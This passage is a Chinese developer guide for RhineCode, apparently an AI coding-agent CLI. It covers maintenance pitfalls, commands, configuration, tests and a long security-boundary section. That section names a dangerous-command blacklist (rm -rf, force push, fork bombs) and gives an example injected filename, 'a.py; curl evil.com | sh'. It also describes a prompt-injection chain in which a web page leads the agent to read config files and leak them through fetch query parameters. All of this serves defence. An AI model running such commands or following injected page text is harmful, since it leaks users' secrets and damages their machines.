- 新增控制通道指令 → `tests/e2e/protocol.py`（取值/错误码）+ `control.py`（`DriverCore` 方法）+ `host.py` 的 `dispatch` 分支 + `client.py`（子命令）+ `test_e2e_control.py`（**五处齐改，漏一处是静默失效**：客户端能发但宿主不认、或宿主认了但没人调得到）
- 产品侧交互结算点新增来源取值 → `tui/app.py` 三处（`_interact` 的待决盒 / `_resolve_interaction` / `_settle_session`）+ `tests/e2e/protocol.py` 的取值集合 + 断言词汇
- `build_app` 新增参数 → `rhinecode/bootstrap.py` + `tests/e2e/host.py` 的装配调用（**宿主是它的第二个真实调用方**，漏改会让驱动设施与真实启动行为分叉，而分叉处恰恰是「验收依据」）
- **`_settle_session` 是会话面板结算的唯一入口** → 将来任何第三条会话结算路径都必须走它，否则丢埋点、丢幂等守卫（`test_tui_keybindings.py` 有结构护栏钉着）
- `tests/e2e/assertions.py` 的十一项断言词汇 ↔ spec F25 清单 → 增删要同步 spec / `assertions.py` / `test_e2e_assertions.py` 三处
- 测试里删沙箱目录 → 一律走 `tests/e2e/sandbox.py` 的 `force_rmtree`，**不要直接写 `shutil.rmtree(path, ignore_errors=True)`**：撞上 git 留下的只读 `.git/objects` 会「删一半」，留下一个只剩空 `.git` 的残骸且**一个错都不报**（实测只在全量测试的并发负载下出现，单跑那条用例必成功，追起来极费劲）
- 新增状态栏字段 → 除原有两处（`compose_status_text` 渲染 + `_refresh_status` 取值）外，`_refresh_status` 现在把**同一份**参数组同时喂给 `compose_status_text` 做 trace 快照。**保持单一参数组、不要抄第二份清单**——抄了会让维护点从两处涨到三处，而漏改的后果是记录里的状态栏文本与用户实际看到的不一致（观测设施撒谎但不报错）
- trace 埋点一律走**受保护漏斗**：`agent/loop.py` 的 `_safe_emit` / `_safe_emit_lazy` / `_safe_scope` / `_safe_bind`。Agent Loop 是唯一会把异常变成「工具结果」回灌模型的地方，埋点异常会伪装成「你的工具坏了」
- `ui_message` 的 AI 正文由 `tui/app.py` `_do_stream` 里的 `reset_text_widgets()` 收尾产出，调用点共**四处**：循环内三处（PROGRESS / TOOL_START / HISTORY）+ **`finally` 里一处**。第四处不可省——前三处都是「靠下一个动作给上一段收尾」，所以一轮运行里的**最后**一段正文没有它就一条事件都不产（P1a 实测发现的 P0 缺口，**界面上完全看不出来**：界面显示得好好的，只是没被记下来）。它在 `finally` 里的位置也定死：`bind_scope(SCOPE_MAIN)` **之后**（该段呈现在主界面上、该记 `main`）、两个 `call_from_thread` **之前**（后者在退出竞态下会抛，放后面等于「出错时不记录」）。护栏见 `tests/test_e2e_control.py::FinalTextRecordedTest`
- `SkillManager` 的 trace 埋点必须在锁**外**（`deactivate` 为此改成「锁内算结果 → 出锁 → 埋点 → 返回」）；明确**不埋** `tool_policy()`——它每轮被调用，埋进去会淹掉时间线

## 常用命令

```bash
pip install -e .                          # 安装（开发模式），生成全局命令 rhine
rhine                                      # 任意目录启动；首次运行自动生成 ~/.rhinecode/config.yaml 模板并引导填 api_key
rhine --config config.yaml                # 显式指定配置文件覆盖全局配置
rhine --continue                          # 启动时恢复最近一次会话，接着上次继续（c9）
python -m rhinecode --config config.yaml  # 未安装/开发调试时的等价入口（需在源码目录）

# 行为记录（trace，跨阶段测试设施；缺省关闭，不开则一个字节都不写）
rhine --trace                             # 写 <项目根>/.rhinecode/traces/<时间戳>.jsonl
rhine --trace /tmp/x.jsonl                # 指定文件

# 阅读产出（只读；刻意不注册控制台入口，避免给 PATH 多一个命令）
python -m rhinecode.trace.reader <文件>                          # 时间线摘要，每事件一行
python -m rhinecode.trace.reader <文件> --type api_request       # 按类型过滤（逗号分隔多个）
python -m rhinecode.trace.reader <文件> --scope isolated:review  # 按作用域过滤（可与 --type 取交集）
python -m rhinecode.trace.reader <文件> --seq 42                 # 展开单条完整负载（截断字段标原长）

# 端到端驱动设施（P1a，跨阶段测试设施；同样不进产品包、不注册控制台入口）
# ① 起一个常驻宿主（它自己建临时工作区与临时用户目录，事后自动删）
python -m tests.e2e.host --mode scripted --script tests.e2e.scripts:CONFIRM_THEN_DONE
python -m tests.e2e.host --mode scripted --script tests.e2e.scripts:THINK_AND_READ \
                         --seed tests.e2e.scripts:seed_basic --keep-workspace
python -m tests.e2e.host --mode live --idle-timeout 600          # 真实模型（需有效凭据）

# ② 用瘦客户端驱动它（每次调用都是独立进程，无状态、无重试）
python -m tests.e2e.client hosts                 # 列出当前宿主（排障用，不需要宿主活着）
python -m tests.e2e.client status                # 三态 / 面板原文与可选项 / 轮次 / 指纹
python -m tests.e2e.client send "写个文件"        # 走真人提交入口（不是内部方法）
python -m tests.e2e.client wait --timeout 180    # 等到 idle 或 pending 两个终态之一
python -m tests.e2e.client answer once           # 应答面板（--via keys 走模拟按键路径）
python -m tests.e2e.client observe --since 42 --types tool_execute   # 读记录增量
python -m tests.e2e.client cancel                # 等价于真人按 Esc
python -m tests.e2e.client quit                  # 优雅退出并清理临时目录

# ③ 跑它的测试（宿主用例会起真实子进程）
python -m unittest tests.test_e2e_host
RHINE_E2E_SLOW=1 python -m unittest tests.test_e2e_host   # 含「连续起停」慢速专项
RHINE_E2E_LIVE=1 python -m unittest tests.test_e2e_live   # 真实模式（缺省 skip）
```

运行时斜杠命令（c10 起大小写不敏感、支持别名与 Tab 补全；未知命令不进 AI、只提示 `/help`）：

- `/help`（别名 `/h`）：按稳定顺序列出全部非隐藏命令的规范名、别名、描述、用法、类型与参数提示（c10）。
- `/think`：在 off / high / max 间循环切换思考模式（Anthropic / DeepSeek 生效）。
- `/plan`：切换 Plan Mode，先规划、澄清和审批，再执行（DeepSeek 工具模式生效）。
- `/perm`（别名 `/permissions`、`/allowed-tools`）：在 默认 / 严格 / 放行 间循环切换权限模式，只影响「规则未命中」的灰色地带兜底（DeepSeek 工具模式生效）。**注意一处例外**：放行档对**网络访问**不生效——未建立域名白名单时仍然弹确认（web_fetch 扩展 F7；其余工具在放行档下的行为逐字不变）。
- `/mcp`：查看各 MCP Server 的连接状态、传输类型、注册工具数与失败原因（纯只读，不改状态）。
- `/context`（别名 `/ctx`）：查看当前上下文近似用量（估算 token / 窗口上限 / 余量 / 已存盘工具结果数 / 是否熔断），纯只读（DeepSeek 工具模式生效）。
- `/compact`：手动触发第二层 LLM 摘要压缩，无余量阈值——主动触发即尝试；历史尚无够旧的早段可摘要时如实回「无可摘要的早段」（DeepSeek 工具模式生效）。
- `/resume`（别名 `/continue`）：无参弹出交互式会话选择面板（列出全部会话：编号/ID/标题/消息数/时间/锁标记，上下键选择、回车载入、Esc 退出；锁定项与当前会话置灰跳过）；`/resume <编号或ID>` 直接载入。载入成功后聊天区清空并回放该会话全部历史（用户消息/AI 回复/简化工具行），存档指针随之切换（被其它实例新鲜锁占用时拒绝且不清屏；载入后逼近窗口先跑一次 c8 压缩）。`rhine --continue` 启动恢复同样回放历史。所有 Provider 生效（c9）。
- `/memory`：查看记忆系统状态——RHINE.md 各层加载与 include 展开、两级笔记数量与索引超限标记、最近一次自动笔记更新结果、当前会话 ID 与已存档消息数、写锁状态。纯只读（c9）。
- `/init`：用内置指令启动一次 Agent Loop，探索项目生成项目根 `RHINE.md`；已存在时不覆盖、只输出改进建议。写盘走完整权限管线（DeepSeek 工具模式生效，c9）。c10 双内容：界面与恢复回放显示 `/init`，模型历史与存档保留展开后的完整提示词（`Message.display_content`）。
- `/skills`：管理 Skill（c11）。五种形态——无参列出全部 Skill 及其来源层级、在哪执行（主对话 / 子对话）、激活状态、加载错误、字段提示，**以及体检建议段**（作者期扩展：七项检查，每条都给出具体改法；无建议时整段不出现；有建议时段尾指向 `/skill-creator`）；`/skills prompt` 查看当前**实际注入**了什么（第一阶段清单 / 已激活正文 / 当前可见工具集），排查「为什么模型没按我的 Skill 做」用；`/skills reload` 热更新定义（已激活的正文自动换新，定义消失的自动卸载，**斜杠短命令一并重新注册**——新增的立刻可补全可执行、删除的随之消失，`allowed-tools` 里认不出的项只丢弃并警告，既不终止进程也不影响下次启动——外部 Skill 里出现 `Task` / `TodoWrite` 这类名字是正常现象。**注意 `WebFetch` 现在是真工具**，写它不再产生「无对应工具类别」警告，但括号里必须写成 `WebFetch(domain:...)`，漏掉前缀会被丢弃并单独警告）；`/skills off [名字]` 卸载指定或全部激活项；`/skills run <名字> [参数]` 执行指定 Skill（通用入口，也是短命令被重名跳过时的替代入口）。
- **Skill 短命令**：每个 Skill 自动注册 `/<name>`（如 `/commit`、`/review`），进 Tab 补全与 `/help`；与内置命令或其别名重名时跳过注册并在启动时提示改用 `/skills run <name>`。
- `/hooks`：查看已加载的 Hook 规则（来源层、事件、条件、动作、本次运行的触发次数与最近结论）、加载警告与配置位置。纯只读，**本章不做 `reload`**，改了规则要重启（c12）。
- `/agents`：查看子 Agent 角色（来源层、说明、最终工具集、模型、轮次上限、**权限档位的声明值与实际生效值**）、加载错误、未生效的定义、本次运行的任务（状态/轮次/用量/结论首行）；`/agents cancel <标识|all>` 取消任务。**本章不做 `reload`**，改了角色定义要重启（c13）。
- `/clear`（别名 `/reset`、`/new`）：清空当前对话历史（并复位上下文压缩的锚点/熔断/已存盘状态；会话存档开新档、旧档保留，c9；一并卸载全部已激活 Skill，c11）。
- `/exit`（别名 `/quit`）：退出程序。

补全与高亮（c10）：输入 `/` 前缀实时弹候选（只显示规范名，别名不参与补全——仍可直接输入执行、完整命中仍高亮、`/help` 可见；隐藏命令不出现）；Tab 单候选直补（有参数提示的命令末尾留一个空格）、多候选弹稳定排序菜单；菜单可见时回车执行当前高亮项；光标进入参数区后 Tab 不拦截。输入框只在命令字段完整命中规范名或别名时以青色加粗高亮该字段，参数与未完成前缀保持普通样式。无参命令忽略多余参数（`/clear now` 仍清空）。

运行中按 `Esc` 会请求取消当前 Agent Loop；如果正在等待确认或澄清，则由当前面板处理取消。

## 配置

完整字段、层级与首次运行的模板生成流程见
**[`docs/internals/config.md`](docs/internals/config.md)**；面向用户的简版在 `README.md`。

要点：

- 不带 `--config` 时读**用户级** `~/.rhinecode/config.yaml`，使 `rhine` 在任意目录都读同一份配置
  （工作目录仍是 AI 操作的项目根）。首次运行自动生成三份模板。
- 四份 YAML 各自的层级：`config.yaml` 用户级；`permissions.yaml` / `mcp.yaml` 用户级 + 项目级
  （权限另有本地级 `*.local.yaml`）；Skill 定义是目录不是 YAML，项目 > 用户 > 内置。
- **权限规则跨层合并后 deny 永远优先**，不按层级覆盖。

## Spec 驱动开发

开发新功能/章节前使用 `/spec` 技能，协作澄清需求后依次生成 `spec.md → plan.md → task.md → checklist.md`，再据此开发与验收。当前主线章节为 `docs/c13/`。

**四份文档放哪，取决于这次做的是「章节」还是「扩展」**：引入新能力层级、架构表要多一层的进 `docs/<章节>/`；在既有层上加工具/加规则/扩边界的进 `docs/extensions/<扩展名>/`，**不占章节号**。判据只有一条：`CLAUDE.md` 的能力表要不要多一行——要就是章节，不要就是扩展。详见 [`docs/extensions/README.md`](docs/extensions/README.md)。

**C12（Hook 系统）的四份文档在 `docs/c12/`**，进门先读 `docs/c12/README.md`。
⚠️ `spec.md` 的 F2 边界第 2 条带一个**勘误块**（实现期发现该条与 F6 的管线位置自相矛盾），
读那一条时必须连勘误一起读。

C11 的全部文档收在 `docs/c11/` 一个目录下，进门先读 **`docs/c11/README.md`**（导航 + 「冲突时以谁为准」）。目录分三块：

- **产品能力（Skill 系统）**——顶层 `spec.md` / `plan.md` / `task.md` / `checklist.md` 是 C11 原始设计；`docs/c11/align/` 下同名四份是**对齐 Agent Skills 开放标准的改造**。**两者冲突时以 `align/` 为准**（`allowed-tools` 的语义、命令名来源、执行模式字段、「谁能触发」是否与「在哪执行」正交、白名单笔误是否 fail-fast，这五处都反过来了）。原始那四份**刻意保留**——它们记录「当初为什么那样设计」，删掉等于把这段历史扔了。
- **跨阶段测试设施**——`docs/c11/testing/`，**不占章节号、不属于 Skill 系统**，服务 C2–C11 与未来所有阶段的验收。`brief.md`（需求交底，同时覆盖两期）+ `p0-trace/`（P0 行为记录器）+ `p1-driver/`（P1a 端到端驱动设施）。两期是**并列**关系不是父子。P1b 尚未开工，范围清单在 `p1-driver/spec.md` 末节。
- **验收记录**——`docs/c11/acceptance/` 下四份实跑报告：`skills-c11-live.md`（C11 原始设计，10 场景 43/43）、`skills-align-live.md`（对齐改造，7 场景 29/29）、`trace-p0-e2e.md`（用 P1a 验 P0）、`driver-p1a.md`（P1a 自身）。每条判据分「机器判到了什么」与「据此做的判断」两栏。

C10（斜杠命令系统）、C9（记忆系统）、C8（上下文管理）、C7（MCP 客户端）、C6（五层防御权限系统）、C5（结构化系统提示与缓存策略）、C4（Agent Loop 与 Plan Mode）文档仍保留，用于追溯设计来源。

## 测试

```bash
python -m compileall rhinecode tests
python -m unittest discover -s tests      # 1728 项，skipped 4
```

默认跳过 4 项：真实模型端到端（需 `RHINE_E2E_LIVE=1` 与有效凭据）与「连续起停」
慢速专项（需 `RHINE_E2E_SLOW=1`）。**本机需装 git**——有预置依赖真实提交历史，
缺 git 时明确报错而非静默跳过（静默跳过会让那些场景假绿）。

逐层的覆盖清单见 **[`docs/internals/testing.md`](docs/internals/testing.md)**（前半是按层的概览表，后半三节是 Skill / Trace / 驱动设施的逐条留存）。
**动某条测试之前先去那里搜一下它**——里面夹着若干「这条护栏为什么不能简化」的说明，
很多看起来啰嗦的写法是踩过坑之后刻意保留的（例如死锁护栏必须用完成计数而不是
布尔标志，同线程版本在 `RLock` 下会静默通过）。

涉及 TUI 行为时，再用 tmux 或真实终端做端到端验证，并对照对应章节的 `checklist.md`。
真实模型下的输出质量留作手测，验收记录在 `docs/c11/acceptance/`。

## 安全边界

权限决定由工具层代码强制，不由模型/prompt 决定（可抵抗 prompt 注入）。每个工具执行前过五层决策管线：

1. **危险命令黑名单**（`permission/blacklist.py`）：正则拦截 `rm -rf` / `git push --force` / fork 炸弹 / `format`、`Remove-Item -Recurse -Force` 等已知高危命令，复合命令逐段+整条双重检查；**不可被任何配置或权限模式放开**。
2. **路径沙箱**（复用 `path_guard`）：文件、glob、grep 工具以启动时的当前工作目录为项目根；拒绝含 `..`、解析后越界的绝对路径、指向项目外的符号链接。
3. **可配置规则**：三层 YAML 的 allow/deny，deny 永远优先。
4. **权限模式**（`/perm`）：严格/默认/放行，只兜底「规则未命中」的灰色地带，翻不了①②③的 deny。
5. **人在回路**：判定为「问用户」时弹确认面板，四选项（本次/本会话/永久/拒绝）。

被拒不终止 Agent Loop，结构化拒绝原因回灌模型。**但「用户在面板里选拒绝」是例外中的例外**：它不是技术失败而是人的决定，回灌文案（`DENIED_BY_USER_FEEDBACK`）明确要求模型停止推进、不要重试/改参数/换工具绕过，转而向用户说明意图并询问拒绝原因；且**下一轮硬性不发任何工具**（`_RoundContext.user_denied` → `tools=None`），使模型在物理上只能产出文本。软硬两道缺一不可——实测只留文案时，一个不听劝的模型会把 25 轮迭代全部烧在重试上（用户要连点 25 次拒绝），加上硬约束后 2 轮结束。护栏见 `tests/test_perm_deny_stops_retry.py`。其它注意：

- 沙箱是应用层前缀校验，管得住文件工具，但管不住 `run_command` 跑起来的脚本自己用代码 open 的文件（已知边界，OS 级沙箱留待后续）。
- `config.yaml` 可能包含真实 API Key，请勿提交到版本库；可用 `deny Read(config.yaml)` 规则进一步阻止模型读取，并阻止 grep/glob 间接泄露该文件内容或路径。
- MCP 工具（c7）：远端 Server 是外部程序、不可信，故 MCP 工具一律 `read_only=False`，默认权限模式下每次调用都经人在回路确认；`kind="other"` 会跳过①黑名单与②沙箱（它们针对本地命令/路径），但仍走③规则（`allow: mcp__server__*` 可放行）与④模式兜底。若工具名被规范化，规则要写注册名而不是远端原名。stdio Server 的子进程行为不受路径沙箱约束（与 `run_command` 同属已知边界）；`mcp_add_server` 会写配置并启动外部 MCP，必须保持 `read_only=False` 且先让用户确认；`mcp.yaml` 的 `env`/`headers` 可能含密钥（如 `${API_KEY}`），同样勿提交真实值，也不要让自动解析逻辑生成真实密钥。
- Skill 系统（c11）三条：① **信任模型**——Skill 正文是「发给模型的文本」，可以指挥模型读写文件、执行命令。项目级 Skill 随代码仓库分发，`git pull` 后可能凭空多出几个，因此每次启动都提示「发现 N 个项目级 Skill」且**刻意不做「只提示一次」的持久化**（有状态的话新增时状态不失效，新来的就被静默吞掉）；评审 `.rhinecode/skills/` 应与评审代码同等对待。② **无权限豁免**——Skill 拿不到任何权限捷径，它指挥的每个工具调用照样过五层管线，正文里写「直接执行 rm -rf /」也只会在第①层黑名单被拦下。③ **`allowed-tools` 是预授权，不是安全边界**——它只**放宽**（列出的操作在本次执行内免于人工确认），从不收紧，且**翻不过前两层**：声明「放行全部命令」的 Skill 照样在第①层黑名单被拦，声明「放行全部写入」照样在第②层沙箱被拦，配置里的 deny 也压得过它（同层内 deny 优先）。要**限制**模型能做什么，唯一手段是 `permissions.yaml` 的 deny 规则。授权跟「触发」走不跟「激活态」走，用户发出下一条消息即失效。另：用户级 `~/.rhinecode/skills/` 与内置目录经 path_guard **只读白名单**放行（目录型 Skill 的随附资源在工作区外，模型需按清单读取），与 c9 的 memory 目录同理——只对 read 类判定生效，write/glob/grep 面完全不动。

  **作者期扩展补两条**：④ **体检只观测、不改判定**——它不影响任何 Skill 的加载结果，也不影响权限管线的任何一层，且**不读任何文件内容**（纯函数零 IO，输入只有已解析的定义）。⑤ **`skill-creator` 无任何写盘旁路**——它指挥的创建与修改一律走 `write_file` / `edit_file` 完整管线，用户在确认面板上看到内容后才落盘；它的 `allowed-tools` **只预授权只读调研**，写入与编辑刻意不给。另：**本版本只能创建项目级 Skill**——用户级与内置目录都在工作区外，写类判定被第②层沙箱一律拒绝（只读白名单**不覆盖写类**），而预授权翻不过第②层。这是结构性限制，`skill-creator` 被要求装到用户级时须如实说明做不到、给出手工做法，**不要尝试写入**（试了只会拿一个「路径越界」去困惑用户）。
- **Hook 系统（c12）五条**：
  ① **Hook 只能收紧，不能放宽**。`pre_tool_use` 的结论只有拦截（deny）/ 升级为人工确认（ask）/ 不表态三种，**没有 allow**；`ask` 也只把权限管线的 ALLOW 升级为 ASK，**绝不把 DENY 降级**。因此 Hook 加进来之后「能通过的调用集合」只会变小，C6 的五层顺序不变量、预授权安全性论证、Skill `allowed-tools` 的「只放宽从不收紧」承诺，全部原样成立。一个照着 Claude Code 文档写出来的 Hook 会输出 `{"decision":"allow"}`，真正拦住它的是 `actions.parse_decision` 里那个白名单分支（有反证测试钉着）。
  ② **项目级 `hooks.yaml` 是本章最大的攻击面**。它随代码仓库分发，而 Hook 的动作**直接执行**、不经模型、不经人在回路确认——`git clone` 一个仓库再启动 rhine，对方写在 `session_start` 上的命令就在你机器上跑起来了。这比项目级 Skill 严重一个量级（Skill 正文只是「发给模型的文本」，它指挥的每个工具调用照样过五层管线）。对冲手段只有一个：启动时**逐条列出**每条项目级规则的「事件 → 动作原文」，命令串与 URL 完整不截断，且**每次启动都提示**（刻意不做持久化——有状态的话 `git pull` 新拉进来的规则会被静默吞掉）。**评审 `.rhinecode/hooks.yaml` 应与评审代码同等对待。**
  ③ **Hook 命令过①危险命令黑名单，不过②③④⑤**。①层的既有性质是「不可被任何配置或权限模式放开」，而 `hooks.yaml` 就是配置。其余四层不过：Hook 是用户配置而非模型行为，过完整管线等于每次自动化都弹确认，自动化即失去意义。
  ④ **配置里不做任何字符串插值**。上下文只经**标准输入的 JSON** 抵达命令，因此模型生成的工具参数不可能被拼进 shell 命令行。做插值的话，一个 `file_path = "a.py; curl evil.com | sh"` 就能让分号后半截跑在用户机器上，而**那不经五层权限管线**（它不是工具调用，是 Hook 自己执行的命令）。
  ⑤ **`http` 动作是本项目第二条主动外发链路**，且比 `web_fetch` 危险——后者「只取不发」（无请求体、无自定义头），前者明确要发 body 与 header。它过②′网络边界层的**结构性硬校验**（禁 `file://`、禁内嵌凭据、禁回环与非公网地址，复用 `permission/network.py` 的同一份实现），但**不要求域名白名单**（`hooks.yaml` 是配置不是模型输出，要求白名单会让「配了 hook 却发不出去」成为常态）。另：Hook 的事件负载含完整工具参数与工具输出，**与 trace 产物同级敏感**——模型读过的配置文件内容会原样进入 `pre_tool_use` 的负载、进而进入 hook 的 stdin 与 `hook_execute` 记录，`http` 动作更会把它发到外部。
- **子 Agent 系统（c13）六条**：
  ① **子 Agent 的能力只会比主对话小，永远不会更大**——这条能被逐层论证，不是约定：
  工具集经三层过滤（委派工具与 Skill 加载工具**永远**不在其中，防无限嵌套）；
  权限档位取 `min(主对话档, 角色声明档)`，**声明放行档不产生任何提权效果**；
  判 ASK 一律自动拒绝；**不继承回合级预授权**（Skill `allowed-tools` 授予的那种）。
  因此「模型能不能委派」不需要单独设闸——它委派出去也做不了自己直接做不了的事。
  ② **委派工具本身不进权限管线**（`system_serial=True`，与 `load_skill` 同先例）。
  委派动作本身无副作用；副作用全部来自子 Agent 调用的工具，那些**逐个**过完整五层
  管线 + Hook 前置层，一道都不少。
  ③ **项目级 `.rhinecode/agents/` 随代码仓库分发**，`git clone` 一个仓库再启动就可能
  多出几个主 Agent 可委派的角色。因此**每次启动都提示**（刻意不做持久化——有状态的话
  `git pull` 新拉进来的会被静默吞掉）。危险程度比 C12 的项目级 `hooks.yaml` **低一个量级**
  （Hook 动作直接执行、不经模型也不经人在回路；角色正文只是「发给模型的文本」），
  故只列名字、不逐条列出正文，且走普通通道而非醒目警告通道——用同一条会稀释掉
  Hook 那条警告的分量。**但评审 `.rhinecode/agents/` 仍应与评审代码同等对待。**
  ④ **缺省配置下子 Agent 实际只能做只读的事**。判 ASK 自动拒绝意味着写文件、跑命令
  都会被挡下。要让它能写，用户必须在 `permissions.yaml` 里写 allow 规则，
  或 `/perm` 切到放行档之后再委派。这是刻意选择的偏严方向。
  ⑤ **子 Agent 的结论会进入主历史**。它读过的文件内容若被写进结论，就会随结论
  一并回到主对话——与 c8 摘要「deny 只挡新读取、挡不住已在历史里的内容」同理。
  ⑥ **Hook 对子 Agent 全量生效**（工具级三事件）。不生效的话主 Agent 只要把
  「跑 git push」委派出去就能绕过用户写的拦截规则。护栏见
  `tests/test_subagent_integration.py::HookIntegrationTest`。
  ⑦ **Plan Mode 的规划阶段只能委派给全只读的角色**。委派工具在那一阶段仍开放
  （规划最需要把调研赶出主上下文），但含写工具的角色会被明确拒绝——
  Plan Mode 的承诺是「批准前不动手」，一个能写文件的子 Agent 会直接绕过它。
  获批进入执行阶段后不再受限。
  ⑧ **等待期间唯一的逃生口是 `Esc`**。委派缺省是「我要这个结果」，模型准备收工时
  循环会停下来等子 Agent——**刻意不设体验意义上的超时**（跑子 Agent 就是在执行任务，
  与主 Agent 自己跑一遍测试套件性质相同）。因此 `gate.wait_any` 必须检查取消信号，
  不检查就等于按了 `Esc` 没用。
- 行为记录（trace，测试设施）：**产物比会话存档更敏感**——里面既有完整的模型请求与响应，也有每次工具执行的参数与**输出原文**（被读过的文件内容、命令输出）。如果模型在对话中读过配置文件，那份内容会原样进入 `tool_execute` 事件，**其中可能含明文 API Key**。三条纪律：① 忽略规则要加在**启动 `rhine` 的那个项目**里——trace 产物落在该项目根的 `.rhinecode/traces/` 下，而本仓库 `.gitignore` 的那行只在开发 RhineCode 时生效；去别的项目跑 trace 前，先给那个项目的 `.gitignore` 补上 `.rhinecode/traces/`（**实测过：不补就会被 `git status` 列出来**）。勿提交、勿外传、勿贴进 issue；② `session_start` 的配置快照里 `api_key` 已被固定掩码替换（`redact_config` 是白名单式逐字段取值，新增含密字段默认不记录），但这**只保证配置快照**——工具输出里的泄漏不在它的职责范围内，由 `.gitignore` 兜底；③ 记录器**不改变任何权限判定**，它只观测；`--trace` 不是权限开关，开启它不会让模型多做任何一件事。另：记录失败一律静默（写盘失败、路径不可写、负载序列化异常全被吞掉），这是**有意的**——观测设施绝不能反过来阻断被观测的系统。
- 端到端驱动设施（P1a，测试设施）四条：① **控制通道不鉴权**——它只绑 `127.0.0.1`、只在宿主活着的这段时间存在，任何能在本机跑程序的人都能连上去驱动它。这是刻意接受的取舍（加鉴权会让一个测试设施凭空多出密钥管理），代价是**驱动期间应把本机视为可信环境**；真实模式尤其要注意，那时宿主进程持有你的真实凭据。② **驱动器不扩大权限面**——它替人应答只是换了第⑤层人在回路的执行者，前四层一字不动：驱动者选「放行」的危险命令照样在第①层黑名单被拦下（`test_e2e_host.py` 有专门护栏钉着这条）。③ **`exclude_tools` 摘掉的两个工具是隔离边界的一部分**：`mcp_add_server` 会写**真实**用户主目录且不吃 `user_dir`，`mcp_resolve_server` 虽是 `read_only=True` 却要访问外部包索引——而只读且被放行的工具**根本不弹面板**，应答者拦不住它。改动这个集合前先想清楚隔离还成不成立。④ **宿主的记录产物与 trace 同等敏感**（它就是 trace），落在临时工作区里、随宿主退出一并删除；用 `--keep-workspace` 保留时请自行按上一条的三条纪律处理。
- **网络访问（web_fetch 扩展）**：这是 RhineCode 第一个**能主动向外发送数据**的工具，三条要点——
  ① **它把一条外泄链路接通了**。此前模型读到的任何敏感内容都烂在本地（没有工具能发出去）；
  「读文件」与「访问网络」凑齐后，「页面里藏一段伪装成系统指令的文本 → 骗模型读配置 →
  把内容拼进下一次抓取的查询参数」这条链成立。防御是**三道叠加**：`<untrusted-content>`
  标注 + 域名白名单 + 「只取不发」（无请求体、无自定义头）。
  ② **缺省配置下第二道防御不存在**——不写任何域名规则时白名单未建立，唯一的实际拦截是
  「每次弹确认」，也就是说这套防御在缺省配置下的真实强度 = 用户面对第 20 次确认面板时的判断力。
  想要真边界，必须在**用户级或项目级** `permissions.yaml` 里写下 `allow: WebFetch(domain:...)`
  （本地级只放行、不建立白名单，见 `docs/extensions/web-fetch/spec.md` 的 F6a）。
  ③ **域名策略只管本扩展的工具**。`run_command` 跑起来的 `curl`/`wget`、以及 **MCP 工具**
  （同样落在 `other` 分支、同样能任意联网）都不受它约束——这是与已知项 #4（OS 级沙箱）
  同一个缺口的两面。另：连接期的域名解析**不受任何超时约束**（标准库解析函数无超时参数，
  `Esc` 也打断不了），DNS rebinding 的时间窗同样未封死，两者都是已知边界。
- 记忆系统（c9）：**会话存档含完整对话原文**（含被读过的敏感文件内容、工具输出），`.rhinecode/sessions/`、`.rhinecode/memory/`、`.rhinecode/context/` 已加入 `.gitignore`，勿提交。笔记落盘与索引重建是**内部可信写盘**（同 c8 存盘先例，不经工具权限管线），但写入路径由代码锁死：LLM 只产出 JSON 动作，`filename` 过 `[a-z0-9_-]+\.md` 白名单校验（防路径注入），物理上出不了两个 memory 目录。用户级 `~/.rhinecode/memory/` 经 path_guard **只读白名单**放行——只对 read 类判定生效（`resolve_readable`/`is_readable_path`），write/glob 判定完全不动，不扩大沙箱其它面。笔记 LLM 请求强制 `tools=None`。锁文件只保证「写不坏」，不提供跨实例实时一致性（语义重复笔记靠 LLM 去重收敛）。/init 生成 RHINE.md 走 `write_file` 完整权限管线（人在回路确认后才落盘）。
- 上下文管理（c8）：第一层存盘写入 `<项目根>/.rhinecode/context/<id>.txt` 属**内部可信写盘**，不经工具权限管线（不是模型发起的工具调用）；存盘内容是工具结果原文，可能含被读过的敏感文件片段，故 `.rhinecode/context/` 应随 `.rhinecode/` 一并 git 忽略、勿提交（已在 `.gitignore`）。第二层摘要会把「较早的对话历史（含工具结果）」作为一条 user 转录发给 LLM——与正常对话同样是把上下文交给模型，无额外外泄面，但若用了 `deny Read(敏感文件)`，注意该文件内容一旦已进入历史仍可能被摘要带走（deny 只挡新读取，挡不住已在历史里的内容）。摘要请求强制 `tools=None`，模型在摘要阶段无法调用任何工具。

## 已知后续工程项

以下问题已完成工程审查确认，但不属于当前阶段开发范围。后续章节会集中补齐；在当前阶段不要把它们视为阻塞项，除非用户明确要求处理：

1. API Key 与敏感配置的读取脱敏、环境变量化或工作区外管理。
2. ~~Plan Mode 规划阶段的工具阶段强校验~~ **已于 2026-07-29 修复**：规划阶段（`plan_mode and not execution_phase`）夹带的非只读工具现在在 `_execute` 的预扫里被独立通道 `plan_blocked` 挡下并回灌「先用 present_plan 提交计划」，trace outcome 为 `plan_blocked`（与 `out_of_scope` **刻意分开**——两处过滤职责不同，回灌指引也不同）。原缺陷有真实观测样本：规划阶段那轮 `tool_names` 里没有 `run_command`，模型仍凭先验调了出来，而当时唯一的守卫只查 Skill 白名单，于是 `outcome=executed`。护栏见 `tests/test_plan_stage_guard.py`（含「放行权限模式下也挡得住」与「获批后放行」两条反证）。
3. `write_file` / `edit_file` 的文件系统级原子写入。
4. OS 级沙箱（Seatbelt / bubblewrap），约束 `run_command` 子进程自身发起的文件/网络访问——C6 的应用层黑名单+路径沙箱已覆盖命令与文件工具的常见高危场景，但管不住子进程内部的间接访问。
5. 权限系统后续项：~~网络请求限制~~ **已于 2026-07-29 由 web_fetch 扩展兑现**（②′网络边界层：结构性硬校验 + 域名策略，见 `docs/extensions/web-fetch/`）；资源配额、审计日志仍留待后续章节。
6. 开发环境依赖固定与 CI，让 `compileall` / `unittest` 在标准环境稳定运行。
7. MCP 后续项（C7 spec 明确不做）：Server 健康检查与自动重连、资源/提示词/采样等非工具能力、MCP 工具的细粒度权限映射与执行超时可配置化、stdio 之外的旧版 HTTP+SSE 传输、MCP 工具结果里图片/二进制内容的实际渲染。
